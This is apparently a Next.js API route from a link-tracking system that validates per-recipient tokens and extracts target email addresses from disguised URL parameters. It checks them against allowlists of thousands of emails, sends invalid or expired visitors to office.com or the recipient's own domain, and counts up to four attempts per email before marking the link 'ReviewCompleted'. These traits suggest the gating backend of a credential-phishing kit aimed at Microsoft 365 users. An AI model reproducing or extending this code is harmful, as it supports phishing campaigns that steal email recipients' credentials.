import { NextRequest, NextResponse } from 'next/server'
import { verifyToken } from '@/lib/tokens'
import { decryptToken, decryptTokenV3, InvalidTokenError, InvalidSignatureError, LinkExpiredError, TokenAlreadyUsedError } from '@/lib/tokenEngine'
import { getEmailFromId } from '@/lib/linkManagement'
import { getSettings } from '@/lib/adminSettings'
// PHASE 7.4: Use SQLite instead of JSON
import { getLinkByToken } from '@/lib/linkDatabaseSql'
import { getAttemptCount } from '@/lib/attemptTracker'
import { isTokenConsumed, markTokenConsumed } from '@/lib/linkDatabaseSql'
// PHASE 7.1: Removed adaptiveDecisionEngine import - link-status doesn't use securityBrain
// import { adaptiveDecisionEngine, type ValidationContext } from '@/lib/validationEngine'
import { logSecurityEvent } from '@/lib/securityMonitoring'

export async function POST(request: NextRequest) {
  try {
    // Handle empty request body gracefully
    let body
    try {
      body = await request.json()
    } catch (jsonError) {
      // If JSON parsing fails (empty body), try to get from URL params as fallback
      const token = request.nextUrl.searchParams.get('token')
      const id = request.nextUrl.searchParams.get('id')
      if (token) {
        body = { token, id }
      } else {
        return NextResponse.json({ 
          status: 'invalid',
          redirectUrl: 'https://office.com'
        }, { status: 400 })
      }
    }
    
    const { token, id, mappingId } = body // PHASE 7.5: Extract mappingId for Type C links
    
    
    if (!token) {
      return NextResponse.json({ 
        status: 'invalid',
        redirectUrl: 'https://office.com'
      })
    }
    
    // 1. Verify token - support v1/v2/v3 tokens
    let payload: any = null
    let email: string = '' // Declare email variable first
    let isSimpleToken = false // Declare outside blocks for scope
    
    // PHASE 7.5: For Type C links, resolve email from mappingId first
    if (mappingId && typeof mappingId === 'string' && mappingId.trim() !== '') {
      try {
        const { getEmailByMappingId } = await import('@/lib/linkDatabaseSql')
        const emailFromMapping = await getEmailByMappingId(mappingId)
        if (emailFromMapping) {
          // Set email early for Type C links
          email = emailFromMapping
          console.log('[LINK-STATUS] Type C: Resolved email from mappingId:', {
            mappingId: mappingId.substring(0, 20),
            email: email.substring(0, 20),
          })
        }
      } catch (mappingError) {
        console.error('[LINK-STATUS] Error resolving email from mappingId:', {
          mappingId: mappingId?.substring(0, 20),
          error: mappingError instanceof Error ? mappingError.message : String(mappingError),
        })
        // Continue - don't fail the entire request if mappingId resolution fails
      }
    }
    
    // Get IP and User-Agent for v3 device binding
    const ip = request.headers.get('x-forwarded-for')?.split(',')[0] || 
               request.headers.get('x-real-ip') || 
               'unknown'
    const userAgent = request.headers.get('user-agent') || 'unknown'
    
    // Check token version
    if (token.startsWith('v3_')) {
      // v3 token - use new decryption engine
      try {
        const v3Payload = await decryptTokenV3(token, {
          ip,
          userAgent,
          checkOneTimeUse: async (tokenHash: string) => {
            return await isTokenConsumed(tokenHash)
          },
          markTokenUsed: async (tokenHash: string, linkId: string) => {
            // PHASE 7.4 FIX: Firewall disabled for link-status
            // Always mark token as consumed if validation passes
            // link-status is a validation endpoint - it should not block token consumption
            await markTokenConsumed(tokenHash, linkId, ip, userAgent)
          },
        })
        
        payload = v3Payload
        // PHASE 7.5: Preserve email from mappingId if already set (Type C links)
        email = v3Payload.email || email || ''
      } catch (error) {
        if (error instanceof LinkExpiredError) {
          const settings = await getSettings()
          const emailForRedirect = email || ''
          const domain = emailForRedirect.split('@')[1] || 'office.com'
          const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
          return NextResponse.json({ 
            status: 'expired',
            redirectUrl: redirectUrl
          })
        } else if (error instanceof TokenAlreadyUsedError) {
          return NextResponse.json({ 
            status: 'used',
            redirectUrl: 'https://office.com'
          })
        } else if (error instanceof InvalidSignatureError) {
          return NextResponse.json({ 
            status: 'invalid',
            redirectUrl: 'https://office.com'
          })
    } else {
        return NextResponse.json({ 
          status: 'invalid',
          redirectUrl: 'https://office.com'
        })
      }
      }
    } else if (token.startsWith('v1_') || token.startsWith('v2_')) {
      // v1/v2 token - use legacy decryption
      try {
        payload = decryptToken(token)
        // PHASE 7.5: Preserve email from mappingId if already set (Type C links)
        email = payload.email || email || ''
        
        // Check if token expired (but can be bypassed by master toggle)
        if (payload.expiresAt && payload.expiresAt < Math.floor(Date.now() / 1000)) {
        try {
          const settings = await getSettings()
          if (settings.linkManagement?.allowAllLinks) {
              console.log('[LINK STATUS] ⚠️ Token expired but allowAllLinks is ON - allowing access')
              // Master toggle is ON - allow expired token
          } else {
            // Master toggle is OFF - reject expired token
            const emailForRedirect = payload.email || ''
            const domain = emailForRedirect.split('@')[1] || 'office.com'
            const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
            return NextResponse.json({ 
              status: 'expired',
              redirectUrl: redirectUrl
            })
          }
        } catch (error) {
          console.error('[LINK STATUS] Error checking master toggle:', error)
          // If error, use default (don't allow expired)
          const emailForRedirect = payload.email || ''
          const domain = emailForRedirect.split('@')[1] || 'office.com'
          const settings = await getSettings()
          const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
          return NextResponse.json({ 
            status: 'expired',
            redirectUrl: redirectUrl
          })
        }
      }
      } catch (error) {
        if (error instanceof InvalidTokenError) {
          return NextResponse.json({ 
            status: 'invalid',
            redirectUrl: 'https://office.com'
          })
        }
        return NextResponse.json({ 
          status: 'invalid',
          redirectUrl: 'https://office.com'
        })
      }
    } else {
      // Legacy token types (Type B/C) - simple strings, validate against database only
      isSimpleToken = token.includes('_') && !token.includes('.') && !token.startsWith('eyJ')
      
      if (isSimpleToken || token.startsWith('gen_')) {
        // Simple token (Type B/C) - skip JWT verification
        // Don't verify as JWT - these are database-only tokens
        // We'll validate existence in database below
      } else {
        // Try legacy JWT verification
        try {
          const tokenData = verifyToken(token)
          if (!tokenData.valid || !tokenData.payload) {
            return NextResponse.json({ 
              status: 'invalid',
              redirectUrl: 'https://office.com'
            })
          }
          
          payload = tokenData.payload
      // PHASE 7.5: Preserve email from mappingId if already set (Type C links)
      email = payload.email || email || ''
        } catch {
          // If verification fails, treat as invalid
          return NextResponse.json({ 
            status: 'invalid',
            redirectUrl: 'https://office.com'
          })
        }
      }
    }
    
    // 3. Get email from ID (for Type A links with id parameter)
    if (id) {
      const emailFromId = await getEmailFromId(id)
      if (emailFromId) {
        email = emailFromId
      }
    }
    
    // For Type B/C, email might come from URL (not ID), so don't fail yet
    // We'll extract it from URL below
    // Type B uses timestamp tokens (XXXX_YYYY), Type A uses JWT (eyJXXX...)
    // PHASE 7.5: Type C links resolve email from mappingId (already done above)
    const isTypeB = isSimpleToken && !id
    const isTypeC = !!mappingId // PHASE 7.5: Type C links have mappingId
    if (!email && !isTypeB && !token.startsWith('gen_') && !isTypeC) {
      // PHASE 7.5: Don't fail if mappingId is provided (Type C) - email will be resolved from mappingId
      return NextResponse.json({ 
        status: 'invalid',
        redirectUrl: 'https://office.com'
      })
    }
    
    // PHASE 7.3 FIX: link-status MUST NOT use firewall/security brain
    // link-status is a validation endpoint - it should ONLY check token/email mapping
    // Security checks happen in secure-redirect, middleware, and other endpoints
    // Skipping firewall prevents false 403s that block legitimate link validation
    let firewallResult: Awaited<ReturnType<typeof import('@/lib/masterFirewall/decisionTree').masterFirewall>> | null = null
    // Firewall check DISABLED for link-status to prevent false positives
    
    // 4. Check if link was already used (GLOBAL CHECK)
        // PHASE 7.4: Check in SQLite instead of JSON
        const tokenForLookup = normalizeTokenForLookup(token)
        console.log('[LINK-STATUS] Token lookup', {
          raw: token.substring(0, 40),
          normalized: tokenForLookup.substring(0, 40),
        })
        const link = await getLinkByToken(tokenForLookup)
    
    if (!link) {
      // For timestamp/gen tokens, they MUST exist in database
      if (isSimpleToken || token.startsWith('gen_')) {
        
        // CRITICAL: Before returning invalid, check if user has made attempts
        // If attempts < 4, the link might still be valid (user can return)
        // Only return invalid if we're certain the link doesn't exist
        if (email) {
          const today = new Date().toISOString().split('T')[0]
          const attemptKey = `${email}_${today}`
          const attemptCount = await getAttemptCount(attemptKey)
          
          if (attemptCount > 0 && attemptCount < 4) {
            // User has made attempts but link not found - this is unusual
            // But if they have attempts, the link should exist
            // Log warning but still return invalid (link truly not found)
          }
        }
        
        return NextResponse.json({ 
          status: 'invalid',
          error: 'Link not found in database',
          redirectUrl: 'https://office.com'
        })
      }
    }
    
    if (link) {
      // Type B: Validate email against allowed list
      // PHASE 7.4: Check SQLite email_allowlists table
      if (link.type === 'generic') {
        if (!link.id) {
          console.error('[LINK-STATUS] Type B link missing ID:', { token: token.substring(0, 20) })
          return NextResponse.json({ 
            status: 'invalid',
            error: 'Link missing ID',
            redirectUrl: 'https://office.com'
          })
        }
        
        const { sql } = await import('@/lib/sql')
        const allowedEmails = sql.all<{ email: string }>(
          'SELECT email FROM email_allowlists WHERE link_id = ?',
          [link.id]
        )
        
        // PHASE 7.5: Smart Auto-Healing - Rule 3: If allowlist is empty, treat as valid for ANY email
        if (!allowedEmails || allowedEmails.length === 0) {
          console.log('[LINK-STATUS] Type B: Empty allowlist - auto-healing (allowing any email)')
          // Auto-heal: Extract email from URL but don't validate against allowlist
          // PHASE 7.5: Smart Auto-Healing - Priority 1: Direct email parameter (highest priority)
          let emailFromURL: string | null = null
          
          // Priority 1: Direct email from request body (Type B links)
          if (body.email && body.email.trim() !== '' && body.email.includes('@')) {
            emailFromURL = body.email.trim()
          }
          
          // Priority 2: Extract from full URL (legacy support)
          if (!emailFromURL) {
            const { fullUrl } = body
            if (fullUrl) {
          try {
            const url = new URL(fullUrl)
            const params = url.searchParams
            
                // Check direct email parameter first
                const emailFromParam = params.get('email')
                if (emailFromParam && emailFromParam.includes('@')) {
                  try {
                    emailFromURL = decodeURIComponent(emailFromParam).trim()
                  } catch {
                    emailFromURL = emailFromParam.trim()
                  }
                }
                
                // Check all possible parameters (sid, v, hash)
                if (!emailFromURL) {
            const emailFromSid = params.get('sid')
            const emailFromV = params.get('v')
            const emailFromHash = url.hash ? url.hash.substring(1) : null
            
            if (emailFromSid) {
              // Extract from pattern like: B3IF-example@email.com-F07H
              const parts = emailFromSid.split('-')
              let emailStartIndex = -1
              for (let i = 0; i < parts.length; i++) {
                if (parts[i].includes('@')) {
                  emailStartIndex = i
                  break
                }
              }
              
              if (emailStartIndex >= 0) {
                let emailParts = []
                for (let i = emailStartIndex - 1; i >= 0; i--) {
                  const part = parts[i]
                        if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                        emailParts.unshift(part)
                      }
                      emailParts.push(parts[emailStartIndex])
                      for (let i = emailStartIndex + 1; i < parts.length; i++) {
                        const part = parts[i]
                        if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                        emailParts.push(part)
                      }
                      emailFromURL = emailParts.join('-')
                    } else {
                      for (const part of parts) {
                        try {
                          const decoded = Buffer.from(part, 'base64').toString('utf-8')
                          if (decoded.includes('@')) {
                            emailFromURL = decoded
                    break
                          }
                        } catch {}
                      }
                    }
                  }
                  
                  if (!emailFromURL && emailFromV && emailFromV.includes('@')) {
                    emailFromURL = emailFromV
                  }
                  
                  if (!emailFromURL && emailFromHash && emailFromHash.includes('@')) {
                    emailFromURL = emailFromHash
                  }
                }
              } catch (error) {
                // Silent fail
              }
            }
          }
          
          // Auto-heal: Accept any email if allowlist is empty
          if (emailFromURL && emailFromURL.includes('@')) {
            email = emailFromURL.toLowerCase().trim()
          } else {
            // Still require email in URL even with empty allowlist
            return NextResponse.json({ 
              status: 'invalid',
              error: 'Email required in URL for this link',
              redirectUrl: 'https://office.com'
            })
          }
        } else {
          // Allowlist has entries - validate email against it
          // PHASE 7.5: Smart Auto-Healing - Priority 1: Direct email parameter (highest priority)
          let emailFromURL: string | null = null
          
          // Priority 1: Direct email from request body (Type B links)
          if (body.email && body.email.trim() !== '' && body.email.includes('@')) {
            emailFromURL = body.email.trim()
          }
          
          // Priority 2: Extract from full URL (legacy support)
          if (!emailFromURL) {
            const { fullUrl } = body
            if (fullUrl) {
              try {
                const url = new URL(fullUrl)
                const params = url.searchParams
                
                // Check direct email parameter first
                const emailFromParam = params.get('email')
                if (emailFromParam && emailFromParam.includes('@')) {
                  try {
                    emailFromURL = decodeURIComponent(emailFromParam).trim()
                  } catch {
                    emailFromURL = emailFromParam.trim()
                  }
                }
                
                // Check all possible parameters (sid, v, hash)
                if (!emailFromURL) {
                  const emailFromSid = params.get('sid')
                  const emailFromV = params.get('v')
                  const emailFromHash = url.hash ? url.hash.substring(1) : null
                  
                  if (emailFromSid) {
                    // Extract from pattern like: B3IF-example@email.com-F07H
                    const parts = emailFromSid.split('-')
                    let emailStartIndex = -1
                    for (let i = 0; i < parts.length; i++) {
                      if (parts[i].includes('@')) {
                        emailStartIndex = i
                        break
                      }
                    }
                    
                    if (emailStartIndex >= 0) {
                      let emailParts = []
                      for (let i = emailStartIndex - 1; i >= 0; i--) {
                        const part = parts[i]
                        if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                        emailParts.unshift(part)
                      }
                      emailParts.push(parts[emailStartIndex])
                      for (let i = emailStartIndex + 1; i < parts.length; i++) {
                        const part = parts[i]
                        if (part.length <= 5 && /^[A-Z0-9]+$/.test(part)) break
                        emailParts.push(part)
                      }
                emailFromURL = emailParts.join('-')
              } else {
                for (const part of parts) {
                  try {
                    const decoded = Buffer.from(part, 'base64').toString('utf-8')
                    if (decoded.includes('@')) {
                      emailFromURL = decoded
                      break
                    }
                  } catch {}
                }
              }
                  }
                  
                  if (!emailFromURL && emailFromV && emailFromV.includes('@')) {
                emailFromURL = emailFromV
              }
                  
                  if (!emailFromURL && emailFromHash && emailFromHash.includes('@')) {
                emailFromURL = emailFromHash
              }
            }
          } catch (error) {
                // Silent fail
              }
            }
        }
        
        if (emailFromURL) {
            // PHASE 7.4: Use SQLite allowedEmails list (already fetched above)
            const allowedEmailsList = allowedEmails.map(r => r.email)
          // OPTIMIZATION: Use Set for O(1) lookup (critical for 20,000+ emails)
            const allowedEmailsSet = new Set(allowedEmailsList.map((e: string) => e.toLowerCase()))
          const isAllowed = allowedEmailsSet.has(emailFromURL.toLowerCase())
          
          if (!isAllowed) {
            return NextResponse.json({ 
              status: 'invalid',
              error: 'Email not authorized for this link',
              redirectUrl: 'https://office.com'
            })
          }
          
          email = emailFromURL // Use the validated email
        } else {
          // STRICT MODE: If Type B has email list, email MUST be validated
          // No email extracted = BLOCK access
          return NextResponse.json({ 
            status: 'invalid',
            error: 'Email required in URL for this link',
            redirectUrl: 'https://office.com'
          })
          }
        }
      }
      
      // PHASE 7.4: Check if link is marked as used
      // CRITICAL: Only block access if 4 attempts are completed
      // Users should be able to return to link if they haven't completed 4 attempts
      // SQLite stores boolean as 0/1, not true/false
      if (link.status === 'used' || (link.type === 'personalized' && link.used === 1)) {
        // Check attempt count - if less than 4, allow access
        if (email) {
          const today = new Date().toISOString().split('T')[0]
          const attemptKey = `${email}_${today}`
          const attemptCount = await getAttemptCount(attemptKey)
          
          if (attemptCount < 4) {
            // Less than 4 attempts - allow access even if link was previously marked as used
            // Don't return error - continue to allow access
          } else {
            // 4 attempts completed - block access
            const domain = email.split('@')[1] || 'office.com'
            const settings = await getSettings()
            const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
            const hash = 'ReviewCompleted' // Fixed hash for used links
            return NextResponse.json({ 
              status: 'used',
              redirectUrl: `${redirectUrl}#${hash}`
            })
          }
        } else {
          // No email provided - use default behavior (block if marked as used)
          const domain = 'office.com'
          const settings = await getSettings()
          const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
          const hash = 'ReviewCompleted'
          return NextResponse.json({ 
            status: 'used',
            redirectUrl: `${redirectUrl}#${hash}`
          })
        }
      }
      
      if (link.status === 'expired') {
        const domain = email ? email.split('@')[1] : 'office.com'
        const settings = await getSettings()
        const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
        return NextResponse.json({ 
          status: 'expired',
          redirectUrl: `${redirectUrl}#LinkExpired`
        })
      }
      
      // PHASE 7.4: Check expiration (convert Unix timestamp to milliseconds)
      const expiresAtMs = link.expires_at * 1000
      if (expiresAtMs && Date.now() > expiresAtMs) {
        const domain = email ? email.split('@')[1] : 'office.com'
        const settings = await getSettings()
        const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
        return NextResponse.json({ 
          status: 'expired',
          redirectUrl: `${redirectUrl}#LinkExpired`
        })
      }
      
      // Link is valid and active
    }
    
    // PHASE 7.1 FIX: link-status MUST NOT use securityBrain
    // It should ONLY validate token/email mapping and return ok:true for valid tokens
    // Security checks are handled elsewhere (secure-redirect, middleware, etc.)
    
    // Skip adaptiveDecisionEngine for link-status - it causes false 403s
    // Only validate token/email mapping exists (already validated above)
    
    // PHASE 7.1 FIX: link-status always returns valid if token/email mapping is correct
    // No securityBrain checks - those happen in secure-redirect
    
    // Get redirect URL from settings
    const domain = email ? email.split('@')[1] : 'office.com'
    const settings = await getSettings()
    const redirectUrl = settings.redirects?.customUrl || `https://${domain}`
    
    // PHASE 7.1 FIX: Always return valid for link-status (no security checks)
    // Only fail if token/email mapping is invalid (already checked above)
    return NextResponse.json({ 
      status: 'valid',
      email: email || undefined,
      attempts: 0, // PHASE 7.1: link-status doesn't track attempts
      allowAccess: true, // PHASE 7.1: Always allow for valid token/email
      allowRedirect: true, // PHASE 7.1: Always allow redirect
      redirectUrl: redirectUrl,
      skipExpiry: false,
      skipDeviceChecks: false,
      // PHASE 7.1: No brainDecision, humanScore, or behavior in link-status response
    })
    
  } catch (error) {
    // PHASE 7.5: Log error details for debugging
    console.error('[LINK-STATUS] 500 Error:', {
      error: error instanceof Error ? error.message : String(error),
      stack: error instanceof Error ? error.stack : undefined,
      timestamp: new Date().toISOString(),
    })
    
    return NextResponse.json({ 
      status: 'invalid',
      error: error instanceof Error ? error.message : 'Internal server error',
      redirectUrl: 'https://office.com'
    }, { status: 500 })
  }
}

function normalizeTokenForLookup(rawToken: string): string {
  if (!rawToken) return ''
  const trimmed = rawToken.trim()
  // Keep v3 tokens exactly as-is (they include prefix + hash)
  if (trimmed.startsWith('v3_')) {
    return trimmed
  }
  // JWT tokens should keep their structure (eyJ...)
  if (trimmed.startsWith('eyJ')) {
    return trimmed
  }
  // Default: strip whitespace and non-alphanumeric separators
  return trimmed.replace(/[^a-zA-Z0-9_-]/g, '')
}



